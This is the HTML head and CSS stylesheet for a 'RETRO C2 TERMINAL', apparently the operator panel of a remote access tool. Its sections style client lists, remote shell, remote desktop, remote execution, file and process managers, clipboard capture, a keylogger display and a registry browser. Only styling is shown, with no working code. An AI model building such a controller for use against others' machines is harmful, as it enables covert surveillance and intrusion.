<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RETRO C2 TERMINAL</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
       body {
    font-family: 'Orbitron', monospace;
    background: #000000;
    color: #00ff00;
    overflow: hidden;
    position: relative;
}

#bgVideo {
    position: fixed;
    top: 50%;
    left: 50%;
    min-width: 100%;
    min-height: 100%;
    width: auto;
    height: auto;
    z-index: -1;
    transform: translateX(-50%) translateY(-50%);
    filter: brightness(0.3) blur(2px);
}

/* Overlay to darken video */
body::after {
    content: '';
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.7);
    z-index: 0;
    pointer-events: none;
}

/* Make sure container is above video */
.container {
    position: relative;
    z-index: 1;
    height: 100vh;
    display: grid;
    grid-template-columns: 1fr 1fr;
    grid-template-rows: auto 1fr auto;
    gap: 10px;
    padding: 10px;
}
        
        @keyframes scanlines {
            0% { background-position: 0 0; }
            100% { background-position: 0 4px; }
        }
        
        @keyframes glow {
            0%, 100% { text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 0 0 15px #00ff00; }
            50% { text-shadow: 0 0 2px #00ff00, 0 0 5px #00ff00, 0 0 8px #00ff00; }
        }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
        
        .container {
            height: 100vh;
            display: grid;
            grid-template-columns: 1fr 1fr;
            grid-template-rows: auto 1fr auto;
            gap: 10px;
            padding: 10px;
        }
        
        .header {
            grid-column: 1 / -1;
            text-align: center;
            padding: 20px;
            border: 2px solid #00ff00;
            border-radius: 10px;
            background: rgba(0, 255, 0, 0.05);
            position: relative;
            overflow: hidden;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(0, 255, 0, 0.1), transparent);
            animation: rotate 3s linear infinite;
        }
        
        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .header h1 {
            font-size: 2.5em;
            font-weight: 900;
            animation: glow 2s ease-in-out infinite;
            position: relative;
            z-index: 1;
        }
        
        .status {
            font-size: 1.2em;
            margin-top: 10px;
            position: relative;
            z-index: 1;
        }
        
        .clients-panel, .terminal-panel {
            border: 2px solid #00ff00;
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            overflow: hidden;
        }
        
        .panel-title {
            font-size: 1.5em;
            font-weight: 700;
            margin-bottom: 15px;
            text-align: center;
            animation: glow 3s ease-in-out infinite;
        }
        
        .clients-list {
            height: calc(100% - 60px);
            overflow-y: auto;
            scrollbar-width: thin;
            scrollbar-color: #00ff00 #000000;
        }
        
        .clients-list::-webkit-scrollbar {
            width: 8px;
        }
        
        .clients-list::-webkit-scrollbar-track {
            background: #000000;
        }
        
        .clients-list::-webkit-scrollbar-thumb {
            background: #00ff00;
            border-radius: 4px;
        }
        
        .client-item {
            padding: 15px;
            margin: 5px 0;
            border: 1px solid #004400;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s ease;
            background: rgba(0, 255, 0, 0.02);
        }
        
        .client-item:hover {
            border-color: #00ff00;
            background: rgba(0, 255, 0, 0.1);
            transform: translateX(5px);
        }
        
        .client-item.selected {
            border-color: #00ff00;
            background: rgba(0, 255, 0, 0.15);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }
        
        .client-id {
            font-weight: 700;
            font-size: 1.1em;
        }
        
        .client-info {
            font-size: 0.9em;
            opacity: 0.8;
            margin-top: 5px;
        }
        
        .client-status {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #00ff00;
            margin-right: 10px;
            animation: blink 1s infinite;
        }
        
        .terminal {
            height: calc(100% - 120px);
            background: #000000;
            border: 1px solid #004400;
            border-radius: 5px;
            padding: 15px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            line-height: 1.4;
        }
        
        .terminal-output {
            white-space: pre-wrap;
            margin-bottom: 10px;
        }
        
        .command-input-container {
            display: flex;
            align-items: center;
            margin-top: 15px;
            gap: 10px;
        }
        
        .prompt {
            color: #00ff00;
            font-weight: bold;
        }
        
        .command-input {
            flex: 1;
            background: transparent;
            border: none;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 1em;
            outline: none;
            padding: 5px;
            border-bottom: 1px solid #004400;
        }
        
        .command-input:focus {
            border-bottom-color: #00ff00;
        }
        
        .send-btn {
            background: transparent;
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-family: 'Orbitron', monospace;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        
        .send-btn:hover {
            background: rgba(0, 255, 0, 0.2);
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
        }
        
        .send-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .footer {
            grid-column: 1 / -1;
            text-align: center;
            padding: 10px;
            border-top: 1px solid #004400;
            font-size: 0.9em;
            opacity: 0.7;
        }
        
        .connection-status {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 10px;
        }
        
        .connected {
            background: #00ff00;
            animation: blink 1s infinite;
        }
        
        .disconnected {
            background: #ff0000;
        }
        
        .shell-selector {
            margin-bottom: 10px;
        }
        
        .shell-selector select {
            background: #000000;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 5px 10px;
            border-radius: 3px;
            font-family: 'Orbitron', monospace;
        }
        
        .no-clients {
            text-align: center;
            opacity: 0.6;
            margin-top: 50px;
            font-style: italic;
        }
        
        /* Remote Desktop Modal */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 2000;
            display: none;
            align-items: center;
            justify-content: center;
        }
        
        .modal {
            background: #000000;
            border: 3px solid #00ff00;
            border-radius: 15px;
            width: 95%;
            height: 95%;
            max-width: 1600px;
            position: relative;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.4);
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        
        .modal-header {
            padding: 15px 20px;
            border-bottom: 2px solid #00ff00;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(0, 255, 0, 0.05);
            flex-shrink: 0;
        }
        
        .modal-title {
            font-size: 1.3em;
            font-weight: bold;
            animation: glow 3s ease-in-out infinite;
        }
        
        .modal-close {
            background: transparent;
            border: 2px solid #ff0000;
            color: #ff0000;
            padding: 6px 12px;
            border-radius: 5px;
            cursor: pointer;
            font-family: 'Orbitron', monospace;
            font-weight: bold;
            transition: all 0.3s ease;
            font-size: 0.9em;
        }
        
        .modal-close:hover {
            background: rgba(255, 0, 0, 0.2);
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
        }
        
        .modal-body {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 15px;
            min-height: 0;
        }
        
        .rdp-controls {
            display: flex;
            gap: 15px;
            align-items: center;
            margin-bottom: 15px;
            padding: 10px;
            border: 1px solid #004400;
            border-radius: 8px;
            background: rgba(0, 255, 0, 0.02);
            flex-wrap: wrap;
            flex-shrink: 0;
        }
        
        .rdp-btn {
            background: transparent;
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 8px 16px;
            border-radius: 5px;
            cursor: pointer;
            font-family: 'Orbitron', monospace;
            font-weight: bold;
            transition: all 0.3s ease;
            min-width: 80px;
            font-size: 0.9em;
        }
        
        .rdp-btn:hover {
            background: rgba(0, 255, 0, 0.2);
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
        }
        
        .rdp-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .rdp-btn.stop {
            border-color: #ff6600;
            color: #ff6600;
        }
        
        .rdp-btn.stop:hover {
            background: rgba(255, 102, 0, 0.2);
            box-shadow: 0 0 15px rgba(255, 102, 0, 0.5);
        }
        
        .quality-selector {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .quality-selector select {
            background: #000000;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 6px 10px;
            border-radius: 3px;
            font-family: 'Orbitron', monospace;
            font-size: 0.9em;
        }
        
        .rdp-status {
            padding: 6px 12px;
            border-radius: 5px;
            font-weight: bold;
            text-align: center;
            min-width: 100px;
            font-size: 0.9em;
        }
        
        .rdp-status.disconnected {
            background: rgba(255, 0, 0, 0.2);
            border: 1px solid #ff0000;
            color: #ff0000;
        }
        
        .rdp-status.connecting {
            background: rgba(255, 255, 0, 0.2);
            border: 1px solid #ffff00;
            color: #ffff00;
            animation: blink 1s infinite;
        }
        
        .rdp-status.connected {
            background: rgba(0, 255, 0, 0.2);
            border: 1px solid #00ff00;
            color: #00ff00;
        }
        
        .screen-container {
            flex: 1;
            border: 2px solid #004400;
            border-radius: 8px;
            background: #000000;
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 0;
        }
        
        .screen-placeholder {
            text-align: center;
            opacity: 0.6;
            font-size: 1.2em;
        }
        
        .screen-image {
            width: 100%;
            height: 100%;
            object-fit: contain;
            border-radius: 5px;
            display: block;
        }
        
        .fps-counter {
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(0, 0, 0, 0.8);
            padding: 5px 10px;
            border-radius: 3px;
            font-size: 0.9em;
            border: 1px solid #004400;
        }
        
        /* Remote Execute Modal */
        .exec-controls {
            display: flex;
            flex-direction: column;
            gap: 20px;
            padding: 20px;
            border: 1px solid #004400;
            border-radius: 8px;
            background: rgba(0, 255, 0, 0.02);
        }
        
        .file-upload-section {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        
        .file-input-wrapper {
            position: relative;
            overflow: hidden;
            display: inline-block;
        }
        
        .file-input-wrapper input[type=file] {
            position: absolute;
            left: -9999px;
        }
        
        .file-input-label {
            background: transparent;
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-family: 'Orbitron', monospace;
            font-weight: bold;
            transition: all 0.3s ease;
            display: inline-block;
        }
        
        .file-input-label:hover {
            background: rgba(0, 255, 0, 0.2);
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
        }
        
        .file-info {
            color: #00ff00;
            font-size: 0.9em;
            opacity: 0.8;
        }
        
        .progress-section {
            display: none;
        }
        
        .progress-bar-container {
            width: 100%;
            height: 30px;
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #004400;
            border-radius: 5px;
            overflow: hidden;
            position: relative;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #00ff00 0%, #00aa00 100%);
            width: 0%;
            transition: width 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .progress-bar::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(
                45deg,
                transparent 25%,
                rgba(255, 255, 255, 0.1) 25%,
                rgba(255, 255, 255, 0.1) 50%,
                transparent 50%,
                transparent 75%,
                rgba(255, 255, 255, 0.1) 75%
            );
            background-size: 30px 30px;
            animation: progress-stripes 1s linear infinite;
        }
        
        @keyframes progress-stripes {
            0% { background-position: 0 0; }
            100% { background-position: 30px 0; }
        }
        
        .progress-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #000;
            font-weight: bold;
            text-shadow: 0 0 5px #00ff00;
        }
        
        .exec-btn {
            background: transparent;
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 12px 30px;
            border-radius: 5px;
            cursor: pointer;
            font-family: 'Orbitron', monospace;
            font-weight: bold;
            transition: all 0.3s ease;
            font-size: 1.1em;
            text-align: center;
        }
        
        .exec-btn:hover:not(:disabled) {
            background: rgba(0, 255, 0, 0.2);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
        }
        
        .exec-btn:disabled {
            opacity: 0.3;
            cursor: not-allowed;
        }
        
        .exec-btn.danger {
            border-color: #ff0000;
            color: #ff0000;
        }
        
        .exec-btn.danger:hover:not(:disabled) {
            background: rgba(255, 0, 0, 0.2);
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
        }
        
        .exec-output {
            flex: 1;
            background: #000000;
            border: 1px solid #004400;
            border-radius: 5px;
            padding: 15px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            color: #00ff00;
            min-height: 200px;
        }
        
        /* File Manager Styles */
        .fm-container {
            display: flex;
            flex-direction: column;
            height: 100%;
            gap: 15px;
        }
        
        .fm-controls {
            display: flex;
            gap: 15px;
            align-items: center;
            padding: 15px;
            border: 1px solid #004400;
            border-radius: 8px;
            background: rgba(0, 255, 0, 0.02);
            flex-wrap: wrap;
        }
        
        .fm-path-section {
            display: flex;
            gap: 10px;
            align-items: center;
            flex: 1;
            min-width: 300px;
        }
        
        .fm-drive-select {
            background: #000000;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 8px 12px;
            border-radius: 3px;
            font-family: 'Orbitron', monospace;
            cursor: pointer;
        }
        
        .fm-path-input {
            flex: 1;
            background: transparent;
            border: 1px solid #004400;
            color: #00ff00;
            padding: 8px 12px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
        
        .fm-path-input:focus {
            border-color: #00ff00;
            outline: none;
        }
        
        .fm-btn {
            background: transparent;
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 8px 16px;
            border-radius: 5px;
            cursor: pointer;
            font-family: 'Orbitron', monospace;
            font-weight: bold;
            transition: all 0.3s ease;
            white-space: nowrap;
        }
        
        .fm-btn:hover:not(:disabled) {
            background: rgba(0, 255, 0, 0.2);
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
        }
        
        .fm-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .fm-btn.danger {
            border-color: #ff6600;
            color: #ff6600;
        }
        
        .fm-btn.danger:hover:not(:disabled) {
            background: rgba(255, 102, 0, 0.2);
            box-shadow: 0 0 15px rgba(255, 102, 0, 0.5);
        }
        
        .fm-browser {
            flex: 1;
            border: 1px solid #004400;
            border-radius: 8px;
            background: #000000;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }
        
        .fm-header {
            display: grid;
            grid-template-columns: 50px 1fr 120px 150px 100px;
            gap: 10px;
            padding: 10px 15px;
            background: rgba(0, 255, 0, 0.1);
            border-bottom: 1px solid #004400;
            font-weight: bold;
        }
        
        .fm-files {
            flex: 1;
            overflow-y: auto;
            padding: 5px;
        }
        
        .fm-item {
            display: grid;
            grid-template-columns: 50px 1fr 120px 150px 100px;
            gap: 10px;
            padding: 8px 10px;
            margin: 2px 0;
            border: 1px solid transparent;
            border-radius: 3px;
            cursor: pointer;
            transition: all 0.2s ease;
            align-items: center;
        }
        
        .fm-item:hover {
            border-color: #004400;
            background: rgba(0, 255, 0, 0.05);
        }
        
        .fm-item.selected {
            border-color: #00ff00;
            background: rgba(0, 255, 0, 0.1);
        }
        
        .fm-item-icon {
            text-align: center;
            font-size: 1.2em;
        }
        
        .fm-item-name {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        
        .fm-item-size {
            text-align: right;
            opacity: 0.8;
        }
        
        .fm-item-date {
            opacity: 0.8;
        }
        
        .fm-item-type {
            opacity: 0.6;
            text-align: center;
        }
        
        .fm-status {
            padding: 10px 15px;
            border-top: 1px solid #004400;
            background: rgba(0, 255, 0, 0.05);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .fm-progress-modal {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #000000;
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 30px;
            min-width: 400px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
            display: none;
            z-index: 1000;
        }
        
        .fm-progress-title {
            font-size: 1.2em;
            font-weight: bold;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .fm-progress-info {
            margin-bottom: 15px;
            text-align: center;
            opacity: 0.8;
        }


/* Process Manager Styles */
.process-container {
    display: flex;
    flex-direction: column;
    height: 100%;
    gap: 15px;
}

.process-controls {
    display: flex;
    gap: 15px;
    padding: 15px;
    border: 1px solid #004400;
    border-radius: 8px;
    background: rgba(0, 255, 0, 0.02);
    flex-wrap: wrap;
}

.process-search-section {
    display: flex;
    gap: 10px;
    flex: 1;
}

.process-search-input {
    flex: 1;
    background: transparent;
    border: 1px solid #004400;
    color: #00ff00;
    padding: 8px 12px;
    border-radius: 3px;
    font-family: 'Courier New', monospace;
}

.process-search-input:focus {
    border-color: #00ff00;
    outline: none;
}

.process-btn {
    background: transparent;
    border: 2px solid #00ff00;
    color: #00ff00;
    padding: 8px 16px;
    border-radius: 5px;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-weight: bold;
    transition: all 0.3s ease;
}

.process-btn:hover:not(:disabled) {
    background: rgba(0, 255, 0, 0.2);
    box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
}

.process-btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
}

.process-btn.danger {
    border-color: #ff0000;
    color: #ff0000;
}

.process-btn.danger:hover:not(:disabled) {
    background: rgba(255, 0, 0, 0.2);
    box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
}

.process-priority-select {
    background: #000000;
    border: 1px solid #00ff00;
    color: #00ff00;
    padding: 8px 12px;
    border-radius: 3px;
    font-family: 'Orbitron', monospace;
}

.process-list-container {
    flex: 1;
    border: 1px solid #004400;
    border-radius: 8px;
    background: #000000;
    overflow: hidden;
    display: flex;
    flex-direction: column;
}

.process-header {
    display: grid;
    grid-template-columns: 80px 1fr 100px 80px;
    gap: 10px;
    padding: 10px 15px;
    background: rgba(0, 255, 0, 0.1);
    border-bottom: 1px solid #004400;
    font-weight: bold;
}

.process-list {
    flex: 1;
    overflow-y: auto;
    padding: 5px;
}

.process-item {
    display: grid;
    grid-template-columns: 80px 1fr 100px 80px;
    gap: 10px;
    padding: 8px 10px;
    margin: 2px 0;
    border: 1px solid transparent;
    border-radius: 3px;
    cursor: pointer;
    transition: all 0.2s ease;
    align-items: center;
}

.process-item:hover {
    border-color: #004400;
    background: rgba(0, 255, 0, 0.05);
}

.process-item.selected {
    border-color: #00ff00;
    background: rgba(0, 255, 0, 0.1);
}

.process-status {
    padding: 10px 15px;
    border-top: 1px solid #004400;
    background: rgba(0, 255, 0, 0.05);
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.process-dialog {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #000000;
    border: 2px solid #00ff00;
    border-radius: 10px;
    padding: 20px;
    min-width: 400px;
    box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
    z-index: 1000;
}

.dialog-content {
    display: flex;
    flex-direction: column;
    gap: 15px;
}

.dialog-content h3 {
    text-align: center;
    color: #00ff00;
    margin: 0;
}

.dialog-content input {
    background: transparent;
    border: 1px solid #004400;
    color: #00ff00;
    padding: 10px;
    border-radius: 3px;
    font-family: 'Courier New', monospace;
}

.dialog-content input:focus {
    border-color: #00ff00;
    outline: none;
}

.dialog-buttons {
    display: flex;
    gap: 10px;
    justify-content: center;
}

.loading {
    text-align: center;
    padding: 50px;
    opacity: 0.6;
    animation: pulse 1s ease-in-out infinite;
}

@keyframes pulse {
    0%, 100% { opacity: 0.6; }
    50% { opacity: 1; }
}

/* Clipboard Manager Styles */
.clipboard-container {
    display: flex;
    flex-direction: column;
    height: 100%;
    gap: 20px;
}

.clipboard-controls {
    display: flex;
    gap: 15px;
    padding: 15px;
    border: 1px solid #004400;
    border-radius: 8px;
    background: rgba(0, 255, 0, 0.02);
}

.clipboard-btn {
    background: transparent;
    border: 2px solid #00ff00;
    color: #00ff00;
    padding: 10px 20px;
    border-radius: 5px;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-weight: bold;
    transition: all 0.3s ease;
}

.clipboard-btn:hover {
    background: rgba(0, 255, 0, 0.2);
    box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
}

.clipboard-btn.primary {
    background: rgba(0, 255, 0, 0.1);
}

.clipboard-btn.active {
    border-color: #ff6600;
    color: #ff6600;
}

.clipboard-input-section {
    display: flex;
    flex-direction: column;
    gap: 15px;
}

#clipboardInput {
    background: #000000;
    border: 1px solid #004400;
    color: #00ff00;
    padding: 15px;
    border-radius: 5px;
    font-family: 'Courier New', monospace;
    font-size: 14px;
    resize: vertical;
    min-height: 150px;
}

#clipboardInput:focus {
    border-color: #00ff00;
    outline: none;
}

.clipboard-history {
    flex: 1;
    border: 1px solid #004400;
    border-radius: 8px;
    background: #000000;
    overflow: hidden;
    display: flex;
    flex-direction: column;
}

.history-header {
    padding: 10px;
    background: rgba(0, 255, 0, 0.1);
    border-bottom: 1px solid #004400;
    text-align: center;
    font-weight: bold;
}

.history-list {
    flex: 1;
    overflow-y: auto;
    padding: 10px;
}

.history-item {
    padding: 10px;
    margin: 5px 0;
    border: 1px solid #004400;
    border-radius: 5px;
    background: rgba(0, 255, 0, 0.02);
    cursor: pointer;
    transition: all 0.2s ease;
}

.history-item:hover {
    border-color: #00ff00;
    background: rgba(0, 255, 0, 0.05);
}

.history-time {
    font-size: 0.8em;
    color: #666;
    margin-bottom: 5px;
}

.history-content {
    white-space: pre-wrap;
    word-break: break-all;
    max-height: 100px;
    overflow: hidden;
}



/* Keylogger Modal Styles */
.keylogger-container {
    display: flex;
    flex-direction: column;
    height: 100%;
    gap: 20px;
}

.keylogger-controls {
    display: flex;
    gap: 15px;
    align-items: center;
    padding: 15px;
    border: 1px solid #004400;
    border-radius: 8px;
    background: rgba(0, 255, 0, 0.02);
    flex-wrap: wrap;
    position: relative;
    overflow: hidden;
}

.keylogger-controls::before {
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    background: linear-gradient(45deg, transparent, rgba(0, 255, 0, 0.05), transparent);
    animation: rotate 8s linear infinite;
    pointer-events: none;
}

.keylogger-btn {
    background: transparent;
    border: 2px solid #00ff00;
    color: #00ff00;
    padding: 10px 20px;
    border-radius: 5px;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-weight: bold;
    transition: all 0.3s ease;
    position: relative;
    z-index: 1;
    text-transform: uppercase;
    font-size: 0.9em;
}

.keylogger-btn:hover {
    background: rgba(0, 255, 0, 0.2);
    box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
    transform: translateY(-2px);
}

.keylogger-btn:active {
    transform: translateY(0);
}

#keyloggerStartBtn {
    min-width: 140px;
}

#keyloggerStartBtn.active {
    border-color: #ff0000;
    color: #ff0000;
    background: rgba(255, 0, 0, 0.1);
    animation: pulse-red 2s ease-in-out infinite;
}

#keyloggerStartBtn.active:hover {
    background: rgba(255, 0, 0, 0.2);
    box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
}

@keyframes pulse-red {
    0%, 100% { box-shadow: 0 0 10px rgba(255, 0, 0, 0.3); }
    50% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.6); }
}

.keylogger-status {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 8px 15px;
    border: 1px solid #004400;
    border-radius: 5px;
    margin-left: auto;
    background: rgba(0, 0, 0, 0.5);
}

.status-indicator {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    background: #444;
    position: relative;
}

.status-indicator::before {
    content: '';
    position: absolute;
    top: -2px;
    left: -2px;
    right: -2px;
    bottom: -2px;
    border-radius: 50%;
    background: inherit;
    opacity: 0.3;
}

.status-indicator.active {
    background: #00ff00;
    animation: blink 1s infinite, glow-pulse 2s ease-in-out infinite;
}

.status-indicator.inactive {
    background: #ff0000;
}

@keyframes glow-pulse {
    0%, 100% { box-shadow: 0 0 5px currentColor; }
    50% { box-shadow: 0 0 15px currentColor, 0 0 25px currentColor; }
}

#keyloggerStatusText {
    font-weight: bold;
    text-transform: uppercase;
    font-size: 0.9em;
    letter-spacing: 1px;
}

.keylog-display {
    flex: 1;
    border: 2px solid #004400;
    border-radius: 8px;
    background: #000000;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    position: relative;
}

.keylog-display::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 1px;
    background: linear-gradient(90deg, transparent, #00ff00, transparent);
    animation: scan 3s linear infinite;
}

@keyframes scan {
    0% { transform: translateX(-100%); }
    100% { transform: translateX(100%); }
}

.keylog-header {
    display: flex;
    justify-content: space-between;
    padding: 12px 15px;
    background: rgba(0, 255, 0, 0.1);
    border-bottom: 2px solid #004400;
    font-weight: bold;
    font-size: 1.1em;
    letter-spacing: 1px;
}

.keylog-header span:first-child {
    animation: glow 3s ease-in-out infinite;
}

#keylogSize {
    color: #00ffff;
    font-size: 0.9em;
}

.keylog-content {
    flex: 1;
    padding: 20px;
    overflow-y: auto;
    font-family: 'Courier New', monospace;
    white-space: pre-wrap;
    word-break: break-all;
    line-height: 1.6;
    color: #00ff00;
    background: 
        repeating-linear-gradient(
            0deg,
            transparent,
            transparent 20px,
            rgba(0, 255, 0, 0.02) 20px,
            rgba(0, 255, 0, 0.02) 21px
        );
    font-size: 14px;
    letter-spacing: 0.5px;
}

.keylog-content::-webkit-scrollbar {
    width: 10px;
}

.keylog-content::-webkit-scrollbar-track {
    background: #000000;
    border-left: 1px solid #004400;
}

.keylog-content::-webkit-scrollbar-thumb {
    background: #00ff00;
    border-radius: 0;
}

.keylog-content::-webkit-scrollbar-thumb:hover {
    background: #00ff88;
}

/* Special key highlighting */
.special-key {
    color: #ff6600;
    font-weight: bold;
    text-shadow: 0 0 3px #ff6600;
    padding: 0 2px;
}

.timestamp {
    color: #666;
    font-size: 0.85em;
    font-style: italic;
}

.keylog-stats {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 15px;
    padding: 15px;
    border: 1px solid #004400;
    border-radius: 8px;
    background: rgba(0, 255, 0, 0.02);
    text-align: center;
    position: relative;
    overflow: hidden;
}

.keylog-stats::after {
    content: '';
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    height: 2px;
    background: linear-gradient(90deg, 
        transparent, 
        #00ff00 20%, 
        #00ff00 80%, 
        transparent
    );
    animation: slide 3s linear infinite;
}

@keyframes slide {
    0% { transform: translateX(-100%); }
    100% { transform: translateX(100%); }
}

.keylog-stats > div {
    display: flex;
    flex-direction: column;
    gap: 5px;
    font-size: 0.9em;
}

.keylog-stats > div:first-child {
    color: #888;
    text-transform: uppercase;
    letter-spacing: 1px;
}

.keylog-stats span {
    color: #00ffff;
    font-weight: bold;
    font-size: 1.3em;
    text-shadow: 0 0 5px #00ffff;
    font-family: 'Orbitron', monospace;
}

/* Empty state styling */
.keylog-content:empty::before {
    content: 'No keystrokes captured yet...';
    color: #666;
    font-style: italic;
    text-align: center;
    display: block;
    margin-top: 50px;
}

/* Responsive adjustments */
@media (max-width: 768px) {
    .keylogger-controls {
        justify-content: center;
    }
    
    .keylogger-status {
        width: 100%;
        margin-left: 0;
        margin-top: 10px;
        justify-content: center;
    }
    
    .keylog-stats {
        grid-template-columns: repeat(2, 1fr);
    }
}

.registry-container {
    display: flex;
    flex-direction: column;
    height: 100%;
    gap: 15px;
}

.registry-controls {
    display: flex;
    gap: 15px;
    padding: 15px;
    border: 1px solid #004400;
    border-radius: 8px;
    background: rgba(0, 255, 0, 0.02);
    flex-wrap: wrap;
}

.registry-path-section {
    display: flex;
    gap: 10px;
    flex: 1;
    align-items: center;
}

.registry-hive-select {
    background: #000000;
    border: 1px solid #00ff00;
    color: #00ff00;
    padding: 8px 12px;
    border-radius: 3px;
    font-family: 'Orbitron', monospace;
    cursor: pointer;
}

.registry-path-input {
    flex: 1;
    background: transparent;
    border: 1px solid #004400;
    color: #00ff00;
    padding: 8px 12px;
    border-radius: 3px;
    font-family: 'Courier New', monospace;
}

.registry-path-input:focus {
    border-color: #00ff00;
    outline: none;
}

.registry-btn {
    background: transparent;
    border: 2px solid #00ff00;
    color: #00ff00;
    padding: 8px 16px;
    border-radius: 5px;
    cursor: pointer;
    font-family: 'Orbitron', monospace;
    font-weight: bold;
    transition: all 0.3s ease;
}

.registry-btn:hover:not(:disabled) {
    background: rgba(0, 255, 0, 0.2);
    box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
}

.registry-btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
}

.registry-btn.danger {
    border-color: #ff0000;
    color: #ff0000;
}

.registry-btn.danger:hover:not(:disabled) {
    background: rgba(255, 0, 0, 0.2);
    box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
}

.registry-browser {
    flex: 1;
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 15px;
    min-height: 0;
}

.registry-tree, .registry-values {
    border: 1px solid #004400;
    border-radius: 8px;
    background: #000000;
    overflow: hidden;
    display: flex;
    flex-direction: column;
}

.tree-header, .values-header {
    padding: 10px;
    background: rgba(0, 255, 0, 0.1);
    border-bottom: 1px solid #004400;
    text-align: center;
    font-weight: bold;
    animation: glow 3s ease-in-out infinite;
}

.tree-content, .values-content {
    flex: 1;
    overflow-y: auto;
    padding: 10px;
}

.registry-key-item {
    padding: 8px 10px;
    margin: 2px 0;
    border: 1px solid transparent;
    border-radius: 3px;
    cursor: pointer;
    transition: all 0.2s ease;
    display: flex;
    align-items: center;
    gap: 8px;
}

.registry-key-item:hover {
    border-color: #004400;
